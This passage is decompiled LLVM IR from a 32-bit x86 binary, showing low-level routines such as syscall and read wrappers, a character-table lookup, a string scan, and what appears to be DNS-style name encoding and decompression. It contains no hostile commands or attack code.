  uselistorder i32 16, { 45, 44, 0, 46, 47, 13, 8, 48, 14, 86, 96, 97, 49, 50, 51, 52, 53, 54, 61, 55, 56, 57, 58, 59, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 87, 88, 89, 90, 98, 99, 100, 101, 102, 103, 104, 105, 125, 15, 16, 30, 24, 40, 31, 32, 39, 33, 129, 1, 34, 35, 36, 3, 2, 94, 5, 4, 95, 7, 6, 72, 73, 19, 9, 20, 11, 17, 130, 74, 75, 76, 77, 78, 79, 91, 92, 80, 81, 82, 83, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 25, 121, 122, 123, 124, 126, 127, 128, 93, 12, 10, 26, 37, 38, 21, 22, 23, 41, 42, 43, 18, 84, 27, 85, 29, 28 }
  uselistorder i32 8, { 65, 64, 66, 0, 1, 67, 68, 69, 70, 71, 72, 6, 73, 2, 13, 78, 79, 80, 81, 30, 82, 138, 33, 15, 16, 17, 18, 34, 19, 20, 35, 36, 21, 37, 22, 38, 39, 83, 139, 140, 141, 142, 143, 144, 32, 31, 145, 146, 147, 148, 168, 169, 170, 171, 26, 176, 27, 177, 43, 28, 44, 23, 46, 59, 91, 47, 48, 92, 93, 94, 95, 96, 97, 98, 7, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 8, 49, 50, 51, 52, 53, 54, 55, 56, 109, 110, 111, 112, 113, 41, 9, 42, 10, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 40, 131, 132, 11, 133, 134, 135, 136, 12, 137, 74, 75, 3, 14, 29, 175, 149, 76, 84, 85, 4, 5, 45, 150, 151, 152, 153, 155, 156, 157, 154, 158, 159, 160, 161, 24, 25, 162, 163, 164, 165, 166, 167, 172, 173, 174, 86, 87, 88, 89, 57, 58, 90, 60, 61, 62, 63, 77 }
  uselistorder i32 -32, { 3, 0, 1, 2 }
  uselistorder i32 32, { 32, 0, 33, 34, 17, 19, 3, 27, 4, 5, 6, 7, 8, 35, 18, 36, 37, 38, 22, 23, 43, 56, 20, 26, 30, 31, 28, 29, 10, 9, 11, 12, 24, 13, 1, 39, 40, 41, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 14, 53, 25, 54, 55, 42, 21, 16, 15 }
  uselistorder i32 4, { 120, 121, 122, 116, 114, 115, 117, 118, 119, 0, 5, 123, 124, 125, 126, 127, 128, 129, 130, 131, 21, 42, 65, 66, 67, 22, 23, 24, 132, 37, 1, 69, 6, 7, 214, 215, 216, 217, 218, 219, 159, 160, 68, 253, 98, 133, 134, 135, 136, 137, 138, 47, 139, 140, 141, 142, 50, 25, 143, 144, 145, 146, 26, 27, 28, 51, 29, 30, 52, 31, 147, 32, 148, 53, 33, 54, 55, 8, 161, 162, 56, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 43, 230, 254, 231, 255, 256, 262, 263, 267, 268, 269, 257, 38, 62, 99, 100, 258, 259, 260, 261, 9, 70, 71, 72, 73, 57, 101, 102, 103, 48, 169, 170, 171, 172, 74, 75, 76, 77, 78, 49, 10, 79, 80, 264, 265, 175, 176, 177, 178, 179, 180, 11, 181, 182, 183, 184, 185, 186, 187, 188, 173, 174, 81, 34, 82, 83, 84, 85, 86, 87, 88, 12, 90, 89, 189, 40, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 20, 210, 211, 41, 212, 13, 58, 149, 150, 39, 151, 152, 153, 154, 2, 14, 3, 266, 15, 155, 92, 232, 16, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 35, 36, 63, 59, 250, 251, 252, 163, 164, 44, 165, 93, 94, 95, 45, 46, 4, 96, 97, 166, 167, 91, 104, 105, 106, 107, 108, 109, 60, 110, 111, 112, 113, 156, 61, 157, 158, 168, 17, 18, 213, 19, 64 }
  uselistorder i32* @ebp, { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 8, 9, 10, 11, 12, 13, 14, 2, 63, 64, 65, 70, 66, 67, 68, 69, 71, 169, 170, 72, 73, 74, 75, 76, 77, 78, 171, 172, 173, 174, 175, 7, 203, 31, 32, 15, 16, 17, 33, 34, 150, 151, 152, 153, 154, 18, 19, 155, 156, 157, 158, 159, 160, 161, 162, 167, 163, 164, 165, 166, 1, 168, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 4, 176, 177, 178, 179, 180, 107, 0, 108, 109, 110, 111, 112, 113, 114, 115, 116, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 3, 197, 20, 21, 22, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 198, 199, 200, 146, 147, 148, 23, 24, 25, 26, 27, 28, 29, 30, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 90, 91, 92, 93, 94, 95, 96, 97, 98, 5, 99, 100, 101, 102, 6, 103, 104, 105, 106, 149, 204, 201, 202 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80525b5, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805257b, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8052531, { 1, 0 }
  uselistorder label %dec_label_pc_8052515, { 1, 0 }
  uselistorder label %dec_label_pc_80524d8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805249f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80524c5, { 1, 0 }
  uselistorder label %dec_label_pc_8052493, { 1, 0 }
  uselistorder label %dec_label_pc_805257b.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052465, { 1, 0 }
  uselistorder label %dec_label_pc_805242a, { 1, 0 }
  uselistorder label %dec_label_pc_8052381, { 1, 0 }
  uselistorder label %dec_label_pc_8052311, { 1, 0 }
}

define i32 @function_80525c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80525c4:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80525c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80525c6, i32* %stack_var_-12, align 4
  %v2_80525ce = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80525ce, i32* %esi.global-to-local, align 4
  %v1_80525e8 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80525e8, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_80525e8, -4095
  br i1 %tmp16, label %dec_label_pc_8052602, label %dec_label_pc_80525f4

dec_label_pc_80525f4:                             ; preds = %dec_label_pc_80525c4
  %v1_80525f4 = call i32 @function_804baa4(i32 %arg3)
  %v0_80525f9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80525f9 = sub i32 0, %v0_80525f9
  %v2_80525fb = inttoptr i32 %v1_80525f4 to i32*
  store i32 %v1_80525f9, i32* %v2_80525fb, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052606

dec_label_pc_8052602:                             ; preds = %dec_label_pc_80525c4
  %v1_8052602 = icmp eq i32 %v1_80525e8, 0
  br i1 %v1_8052602, label %dec_label_pc_805260b, label %dec_label_pc_8052606

dec_label_pc_8052606:                             ; preds = %dec_label_pc_8052602, %dec_label_pc_80525f4
  %v0_8052606 = phi i32 [ %v1_80525e8, %dec_label_pc_8052602 ], [ -1, %dec_label_pc_80525f4 ]
  %v1_8052608 = ashr i32 %v0_8052606, 31
  br label %dec_label_pc_8052613

dec_label_pc_805260b:                             ; preds = %dec_label_pc_8052602
  %v3_805260b = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8052613

dec_label_pc_8052613:                             ; preds = %dec_label_pc_8052606, %dec_label_pc_805260b
  %v0_8052619 = phi i32 [ %v0_8052606, %dec_label_pc_8052606 ], [ %v3_805260b, %dec_label_pc_805260b ]
  %storemerge = phi i32 [ %v1_8052608, %dec_label_pc_8052606 ], [ %tmp, %dec_label_pc_805260b ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8052616 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052616, i32* @ebx, align 4
  ret i32 %v0_8052619

; uselistorder directives
  uselistorder i32 %v1_80525e8, { 1, 2, 0, 3 }
  uselistorder i32 31, { 20, 12, 21, 18, 19, 22, 23, 10, 2, 3, 0, 1, 8, 17, 13, 14, 15, 6, 7, 4, 5, 11, 24, 25, 16, 9 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_8052613, { 1, 0 }
}

define i32 @function_805261c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805261c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805261c = load i32, i32* @edi, align 4
  store i32 %v0_805261c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805262c = load i32, i32* @ebx, align 4
  %v4_8052634 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_805262c, i32* @ebx, align 4
  store i32 %v4_8052634, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8052634, -4095
  br i1 %tmp, label %dec_label_pc_805264c, label %dec_label_pc_8052640

dec_label_pc_8052640:                             ; preds = %dec_label_pc_805261c
  %v1_8052640 = call i32 @function_804baa4(i32 %v0_805262c)
  %v0_8052645 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052645 = sub i32 0, %v0_8052645
  %v2_8052647 = inttoptr i32 %v1_8052640 to i32*
  store i32 %v1_8052645, i32* %v2_8052647, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805264c

dec_label_pc_805264c:                             ; preds = %dec_label_pc_805261c, %dec_label_pc_8052640
  %v0_805264d = phi i32 [ %v4_8052634, %dec_label_pc_805261c ], [ -1, %dec_label_pc_8052640 ]
  %v2_8052650 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052650, i32* @edi, align 4
  ret i32 %v0_805264d

; uselistorder directives
  uselistorder i32 %v4_8052634, { 1, 0, 2 }
  uselistorder i32 %v0_805262c, { 1, 0 }
  uselistorder i32 (i32)* @function_804baa4, { 37, 25, 44, 69, 68, 40, 43, 36, 24, 23, 42, 32, 31, 17, 22, 21, 56, 13, 12, 55, 11, 50, 30, 62, 10, 66, 9, 8, 7, 6, 54, 67, 5, 2, 4, 39, 3, 29, 49, 48, 47, 46, 65, 64, 63, 61, 28, 27, 41, 20, 19, 18, 0, 35, 34, 53, 52, 51, 14, 45, 38, 16, 1, 15, 26, 33, 60, 59, 58, 57 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder label %dec_label_pc_805264c, { 1, 0 }
}

define i32 @function_8052654(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052654:
  store i32 %arg1, i32* @edx, align 4
  %v1_8052658 = add i32 %arg1, 128
  %v6_8052663 = icmp ugt i32 %v1_8052658, 383
  br i1 %v6_8052663, label %dec_label_pc_805266e, label %dec_label_pc_8052665

dec_label_pc_8052665:                             ; preds = %dec_label_pc_8052654
  %v0_8052665 = load i32, i32* bitcast (i32** @global_var_8056448.134 to i32*), align 8
  %v2_805266a = mul i32 %arg1, 2
  %v3_805266a = add i32 %v0_8052665, %v2_805266a
  %v4_805266a = inttoptr i32 %v3_805266a to i16*
  %v5_805266a = load i16, i16* %v4_805266a, align 2
  %v6_805266a = sext i16 %v5_805266a to i32
  store i32 %v6_805266a, i32* @edx, align 4
  br label %dec_label_pc_805266e

dec_label_pc_805266e:                             ; preds = %dec_label_pc_8052654, %dec_label_pc_8052665
  %v0_805266e = phi i32 [ %arg1, %dec_label_pc_8052654 ], [ %v6_805266a, %dec_label_pc_8052665 ]
  ret i32 %v0_805266e

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 15, 43, 45, 19, 16, 22, 23, 20, 17, 21, 18, 24, 28, 25, 31, 29, 26, 32, 33, 30, 27, 34, 35, 36, 37, 38, 39, 41, 40, 42, 44 }
  uselistorder i32 128, { 12, 8, 10, 3, 9, 4, 5, 11, 0, 6, 7, 13, 14, 15, 16, 17, 2, 1, 18 }
  uselistorder label %dec_label_pc_805266e, { 1, 0 }
}

define i32 @function_8052674(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052674:
  %v4_8052675 = ptrtoint i8* %arg1 to i32
  %v2_805267d = mul i32 %arg2, 256
  %v3_805267d = and i32 %v2_805267d, 65280
  %v4_805267d = and i32 %arg2, -65281
  %v5_805267d = or i32 %v3_805267d, %v4_805267d
  %v8_805267f.pre = load i1, i1* @df, align 1
  %v9_805267f = select i1 %v8_805267f.pre, i32 -1, i32 1
  br label %dec_label_pc_805267f

dec_label_pc_805267f:                             ; preds = %dec_label_pc_8052684, %dec_label_pc_8052674
  %v4_805267f = phi i32 [ %v6_805267f, %dec_label_pc_8052684 ], [ %v5_805267d, %dec_label_pc_8052674 ]
  %v7_805267f = phi i32 [ %v10_805267f, %dec_label_pc_8052684 ], [ %v4_8052675, %dec_label_pc_8052674 ]
  %v1_805267f = inttoptr i32 %v7_805267f to i8*
  %v2_805267f = load i8, i8* %v1_805267f, align 1
  %v10_805267f = add i32 %v7_805267f, %v9_805267f
  %v3_8052680 = udiv i32 %v4_805267f, 256
  %v4_8052680 = trunc i32 %v3_8052680 to i8
  %v16_8052680 = icmp eq i8 %v2_805267f, %v4_8052680
  br i1 %v16_8052680, label %dec_label_pc_805268d.loopexit, label %dec_label_pc_8052684

dec_label_pc_8052684:                             ; preds = %dec_label_pc_805267f
  %v3_805267f = zext i8 %v2_805267f to i32
  %v5_805267f = and i32 %v4_805267f, -256
  %v6_805267f = or i32 %v3_805267f, %v5_805267f
  %v4_8052684 = icmp eq i8 %v2_805267f, 0
  %v1_8052686 = icmp eq i1 %v4_8052684, false
  br i1 %v1_8052686, label %dec_label_pc_805267f, label %dec_label_pc_8052688

dec_label_pc_8052688:                             ; preds = %dec_label_pc_8052684
  br label %dec_label_pc_805268d

dec_label_pc_805268d.loopexit:                    ; preds = %dec_label_pc_805267f
  %phitmp = add i32 %v10_805267f, -1
  br label %dec_label_pc_805268d

dec_label_pc_805268d:                             ; preds = %dec_label_pc_805268d.loopexit, %dec_label_pc_8052688
  %v0_805268d = phi i32 [ 0, %dec_label_pc_8052688 ], [ %phitmp, %dec_label_pc_805268d.loopexit ]
  ret i32 %v0_805268d

; uselistorder directives
  uselistorder i8 %v2_805267f, { 1, 2, 0 }
  uselistorder i32 %v4_805267f, { 1, 0 }
  uselistorder i32 -256, { 24, 1, 25, 0, 26, 11, 15, 27, 28, 3, 17, 16, 2, 29, 30, 6, 31, 4, 32, 5, 33, 34, 8, 19, 18, 7, 43, 44, 39, 45, 46, 47, 48, 49, 50, 12, 51, 52, 53, 63, 13, 20, 14, 64, 21, 9, 22, 65, 35, 40, 54, 55, 56, 57, 58, 59, 60, 10, 61, 62, 41, 23, 36, 37, 38, 42 }
  uselistorder i1* @df, { 1, 4, 10, 11, 0, 2, 12, 13, 14, 15, 3, 24, 25, 5, 6, 7, 8, 9, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_8052694(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8052694:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8052695 = load i32, i32* @edi, align 4
  %v0_8052696 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805269d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805269d, i32* @edi, align 4
  %v1_80526fc5 = icmp eq i8* %arg1, null
  br i1 %v1_80526fc5, label %dec_label_pc_8052705, label %dec_label_pc_8052700.lr.ph

dec_label_pc_8052700.lr.ph:                       ; preds = %dec_label_pc_8052694
  br label %dec_label_pc_8052700

dec_label_pc_80526a3:                             ; preds = %dec_label_pc_8052700
  %v0_80526a3 = load i32, i32* @edx, align 4
  %v9_80526a8 = call i32 @function_8052674(i8* %v1_8052700, i32 46, i32 %v0_80526a3, i32 %v0_80526a3)
  %v1_80526b0 = icmp eq i32 %v9_80526a8, 0
  br i1 %v1_80526b0, label %dec_label_pc_80526bc, label %dec_label_pc_80526b6

dec_label_pc_80526b6:                             ; preds = %dec_label_pc_80526a3
  %v1_80526b8 = load i32, i32* @edi, align 4
  %v2_80526b8 = sub i32 %v9_80526a8, %v1_80526b8
  br label %dec_label_pc_80526ca

dec_label_pc_80526bc:                             ; preds = %dec_label_pc_80526a3
  %v0_80526bf = load i32, i32* @edi, align 4
  %v5_80526bf = inttoptr i32 %v0_80526bf to i8*
  %v3_80526c0 = call i32 @function_804d514(i8* %v5_80526bf)
  br label %dec_label_pc_80526ca

dec_label_pc_80526ca:                             ; preds = %dec_label_pc_80526b6, %dec_label_pc_80526bc
  %v0_80526dd = phi i32 [ %v2_80526b8, %dec_label_pc_80526b6 ], [ %v3_80526c0, %dec_label_pc_80526bc ]
  store i32 %v0_80526dd, i32* @esi, align 4
  %v1_80526ca = icmp eq i32 %v0_80526dd, 0
  %v3_80526ca = trunc i32 %v0_80526dd to i8
  br i1 %v1_80526ca, label %dec_label_pc_8052719, label %dec_label_pc_80526ce

dec_label_pc_80526ce:                             ; preds = %dec_label_pc_80526ca
  %v1_80526d2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80526d2 = sub i32 %arg3, %v1_80526d2
  %v1_80526d4 = add i32 %v2_80526d2, -1
  %v7_80526d5 = icmp ult i32 %v0_80526dd, %v1_80526d4
  %v1_80526d7 = icmp eq i1 %v7_80526d5, false
  br i1 %v1_80526d7, label %dec_label_pc_8052719, label %dec_label_pc_80526d9

dec_label_pc_80526d9:                             ; preds = %dec_label_pc_80526ce
  store i32 %arg2, i32* @edx, align 4
  %v4_80526df = add i32 %v1_80526d2, %arg2
  %v5_80526df = inttoptr i32 %v4_80526df to i8*
  store i8 %v3_80526ca, i8* %v5_80526df, align 1
  %v0_80526e2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526e2 = add i32 %v0_80526e2, 1
  %v0_80526e4 = load i32, i32* @edx, align 4
  %v0_80526e6 = load i32, i32* @esi, align 4
  %v2_80526e7 = add i32 %v1_80526e2, %v0_80526e4
  %v0_80526e9 = load i32, i32* @edi, align 4
  %v2_80526ea = add i32 %v0_80526e6, %v1_80526e2
  store i32 %v2_80526ea, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_80526e7 to i16*
  %v7_80526ed = call i32 @function_804d4b8(i16* %tmp30, i32 %v0_80526e9, i32 %v0_80526e6)
  %v1_80526f9 = add i32 %v9_80526a8, 1
  br i1 %v1_80526b0, label %dec_label_pc_8052705, label %dec_label_pc_80526fc

dec_label_pc_80526fc:                             ; preds = %dec_label_pc_80526d9
  store i32 %v1_80526f9, i32* @edi, align 4
  %v1_80526fc = icmp eq i32 %v1_80526f9, 0
  br i1 %v1_80526fc, label %dec_label_pc_8052705, label %dec_label_pc_8052700

dec_label_pc_8052700:                             ; preds = %dec_label_pc_8052700.lr.ph, %dec_label_pc_80526fc
  %v0_80526a7 = phi i32 [ %v4_805269d, %dec_label_pc_8052700.lr.ph ], [ %v1_80526f9, %dec_label_pc_80526fc ]
  %v1_8052700 = inttoptr i32 %v0_80526a7 to i8*
  %v2_8052700 = load i8, i8* %v1_8052700, align 1
  %v3_8052700 = icmp eq i8 %v2_8052700, 0
  %v1_8052703 = icmp eq i1 %v3_8052700, false
  br i1 %v1_8052703, label %dec_label_pc_80526a3, label %dec_label_pc_8052705

dec_label_pc_8052705:                             ; preds = %dec_label_pc_80526fc, %dec_label_pc_8052700, %dec_label_pc_80526d9, %dec_label_pc_8052694
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_8052719, label %dec_label_pc_805270c

dec_label_pc_805270c:                             ; preds = %dec_label_pc_8052705
  %v1_8052710 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052710 = add i32 %v1_8052710, %arg2
  %v3_8052710 = inttoptr i32 %v2_8052710 to i8*
  store i8 0, i8* %v3_8052710, align 1
  %v0_8052714 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052714 = add i32 %v0_8052714, 1
  br label %dec_label_pc_805271c

dec_label_pc_8052719:                             ; preds = %dec_label_pc_80526ce, %dec_label_pc_80526ca, %dec_label_pc_8052705
  br label %dec_label_pc_805271c

dec_label_pc_805271c:                             ; preds = %dec_label_pc_805270c, %dec_label_pc_8052719
  %storemerge3 = phi i32 [ %v1_8052714, %dec_label_pc_805270c ], [ -1, %dec_label_pc_8052719 ]
  store i32 %v0_8052696, i32* @esi, align 4
  store i32 %v0_8052695, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_8052700, { 1, 0 }
  uselistorder i32 %v1_80526f9, { 0, 2, 1 }
  uselistorder i32 %v0_80526e6, { 1, 0 }
  uselistorder i32 %v9_80526a8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_804d514, { 2, 0, 5, 4, 3, 6, 7, 8, 1 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_805271c, { 1, 0 }
  uselistorder label %dec_label_pc_8052719, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052705, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052700, { 1, 0 }
  uselistorder label %dec_label_pc_80526ca, { 1, 0 }
}

define i32 @function_8052724(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052724:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8052726 = load i32, i32* @esi, align 4
  %v4_805272b = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_805272b, label %dec_label_pc_80527f2, label %dec_label_pc_805273a

dec_label_pc_805273a:                             ; preds = %dec_label_pc_8052724
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80527da2541 = add i32 %arg2, %arg1
  %v3_80527da2642 = inttoptr i32 %v2_80527da2541 to i8*
  %v4_80527da2743 = load i8, i8* %v3_80527da2642, align 1
  %v1_80527de2945 = icmp eq i8 %v4_80527da2743, 0
  %v1_80527e03046 = icmp eq i1 %v1_80527de2945, false
  br i1 %v1_80527e03046, label %dec_label_pc_8052748.lr.ph, label %dec_label_pc_80527e6

dec_label_pc_8052748:                             ; preds = %dec_label_pc_8052748.lr.ph, %dec_label_pc_8052761
  %v0_8052752 = phi i32 [ %v0_8052752.pre, %dec_label_pc_8052748.lr.ph ], [ %v4_8052772, %dec_label_pc_8052761 ]
  %v8_805274837 = phi i1 [ %v8_80527483151, %dec_label_pc_8052748.lr.ph ], [ true, %dec_label_pc_8052761 ]
  %v5_80527da36.in = phi i8 [ %v5_80527da2850.in, %dec_label_pc_8052748.lr.ph ], [ %v4_80527da, %dec_label_pc_8052761 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8052748.lr.ph ], [ 0, %dec_label_pc_8052761 ]
  %v0_805274f34 = phi i32 [ %v0_805274f.ph47, %dec_label_pc_8052748.lr.ph ], [ %v2_8052780, %dec_label_pc_8052761 ]
  %v5_80527da36 = zext i8 %v5_80527da36.in to i32
  %v1_805274f = add i32 %v0_805274f34, 1
  store i32 %v1_805274f, i32* @esi, align 4
  %v3_8052752 = select i1 %v8_805274837, i32 2, i32 1
  %v4_8052752 = add i32 %v3_8052752, %v0_8052752
  store i32 %v4_8052752, i32* %ebp.global-to-local, align 4
  %v1_8052755 = and i32 %v5_80527da36, 192
  %v6_805275a = icmp eq i32 %v1_8052755, 192
  %v1_805275f = icmp eq i1 %v6_805275a, false
  br i1 %v1_805275f, label %dec_label_pc_8052784, label %dec_label_pc_8052761

dec_label_pc_8052761:                             ; preds = %dec_label_pc_8052748
  %v2_805276e = add i32 %v1_805274f, %arg1
  %v3_805276e = inttoptr i32 %v2_805276e to i8*
  %v4_805276e = load i8, i8* %v3_805276e, align 1
  %v5_805276e = zext i8 %v4_805276e to i32
  %v4_8052772 = add i32 %v3_8052752, %v4_8052752
  store i32 %v4_8052772, i32* %ebp.global-to-local, align 4
  %v1_8052775 = mul nuw nsw i32 %v5_80527da36, 256
  %v2_8052778 = and i32 %v1_8052775, 16128
  %v2_8052780 = or i32 %v5_805276e, %v2_8052778
  store i32 %v2_8052780, i32* @edx, align 4
  store i32 %v1_80527a1.ph48, i32* @ecx, align 4
  %v2_80527da = add i32 %v2_8052780, %arg1
  %v3_80527da = inttoptr i32 %v2_80527da to i8*
  %v4_80527da = load i8, i8* %v3_80527da, align 1
  %v1_80527de = icmp eq i8 %v4_80527da, 0
  %v1_80527e0 = icmp eq i1 %v1_80527de, false
  br i1 %v1_80527e0, label %dec_label_pc_8052748, label %dec_label_pc_80527e6

dec_label_pc_8052784:                             ; preds = %dec_label_pc_8052748
  %v2_8052784 = add i32 %v5_80527da36, %v1_80527a1.ph48
  %v1_8052789 = add i32 %v2_8052784, 1
  store i32 %v1_8052789, i32* @edi, align 4
  %v10_805278a = icmp ult i32 %v1_8052789, %arg4
  %v1_8052792 = icmp eq i1 %v10_805278a, false
  br i1 %v1_8052792, label %dec_label_pc_80527f2, label %dec_label_pc_8052794

dec_label_pc_8052794:                             ; preds = %dec_label_pc_8052784
  %v2_805279a = add i32 %v1_805274f, %arg1
  %v2_80527a1 = add i32 %v1_80527a1.ph48, %arg3
  %v3_80527a4 = inttoptr i32 %v2_80527a1 to i16*
  %v4_80527a4 = call i32 @function_804d4b8(i16* %v3_80527a4, i32 %v2_805279a, i32 %v5_80527da36)
  %v0_80527b0 = load i32, i32* %ebp.global-to-local, align 4
  %v0_80527b9 = load i32, i32* @esi, align 4
  %v2_80527b9 = add i32 %v0_80527b9, %v5_80527da36
  store i32 %v2_80527b9, i32* @edx, align 4
  %v1_80527c0 = icmp eq i1 %v8_805274837, false
  %v2_80527b0 = select i1 %v1_80527c0, i32 %v5_80527da36, i32 0
  %v4_80527c0 = add i32 %v0_80527b0, %v2_80527b0
  store i32 %v4_80527c0, i32* %ebp.global-to-local, align 4
  %v4_80527d1 = add i32 %v2_8052784, %arg3
  %v5_80527d1 = inttoptr i32 %v4_80527d1 to i8*
  store i8 46, i8* %v5_80527d1, align 1
  %v0_80527d4.pre = load i32, i32* @edi, align 4
  %v1_80527da.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80527d4.pre, i32* @ecx, align 4
  %v2_80527da25 = add i32 %v1_80527da.pre.pre, %arg1
  %v3_80527da26 = inttoptr i32 %v2_80527da25 to i8*
  %v4_80527da27 = load i8, i8* %v3_80527da26, align 1
  %v1_80527de29 = icmp eq i8 %v4_80527da27, 0
  %v1_80527e030 = icmp eq i1 %v1_80527de29, false
  %v8_805274831 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8052752.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80527e030, label %dec_label_pc_8052748.lr.ph, label %dec_label_pc_80527e6

dec_label_pc_8052748.lr.ph:                       ; preds = %dec_label_pc_8052794, %dec_label_pc_805273a
  %v0_8052752.pre = phi i32 [ 0, %dec_label_pc_805273a ], [ %v0_8052752.pre.pre, %dec_label_pc_8052794 ]
  %v8_80527483151 = phi i1 [ false, %dec_label_pc_805273a ], [ %v8_805274831, %dec_label_pc_8052794 ]
  %v5_80527da2850.in = phi i8 [ %v4_80527da2743, %dec_label_pc_805273a ], [ %v4_80527da27, %dec_label_pc_8052794 ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_805273a ], [ %stack_var_-17.135, %dec_label_pc_8052794 ]
  %v1_80527a1.ph48 = phi i32 [ 0, %dec_label_pc_805273a ], [ %v0_80527d4.pre, %dec_label_pc_8052794 ]
  %v0_805274f.ph47 = phi i32 [ %arg2, %dec_label_pc_805273a ], [ %v1_80527da.pre.pre, %dec_label_pc_8052794 ]
  br label %dec_label_pc_8052748

dec_label_pc_80527e6:                             ; preds = %dec_label_pc_8052794, %dec_label_pc_8052761, %dec_label_pc_805273a
  %v0_80527eb = phi i32 [ 0, %dec_label_pc_805273a ], [ %v4_8052772, %dec_label_pc_8052761 ], [ %v0_8052752.pre.pre, %dec_label_pc_8052794 ]
  %v8_8052748.lcssa = phi i1 [ false, %dec_label_pc_805273a ], [ true, %dec_label_pc_8052761 ], [ %v8_805274831, %dec_label_pc_8052794 ]
  %v2_80527ed = zext i1 %v8_8052748.lcssa to i32
